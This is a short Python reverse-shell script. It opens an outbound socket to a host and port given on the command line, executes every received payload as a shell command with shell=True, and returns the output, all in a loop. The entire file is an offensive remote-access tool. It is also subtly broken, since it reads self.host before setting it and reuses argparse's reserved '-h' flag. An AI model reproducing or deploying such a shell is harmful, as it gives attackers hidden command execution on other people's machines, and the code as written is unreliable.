import socket
import subprocess
import argparse
from log_colors import *

# simple reverse shell
class RevShell:

    def __init__(self, host, port):
        print (LogColors.BLUE + "create reverse shell on " + self.host + "..." + LogColors.ENDC)
        self.host = host
        self.port = int(port)

    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host, self.port))
        print (LogColors.BLUE + "create connect..." + LogColors.ENDC)
        while True:
            data = sock.recv(1024)
            proc = subprocess.Popen(data, stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell = True)
            stdoutv = proc.stdout.read() + proc.stderr.read()
            sock.send(stdoutv)

        sock.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-h','--host', required = True, help = "the remote host")
    parser.add_argument('-p','--port', required = True, help = "port")
    args = vars(parser.parse_args())
    host, port = args['host'], args['port']
    shell = RevShell(host, port)
    shell.run()

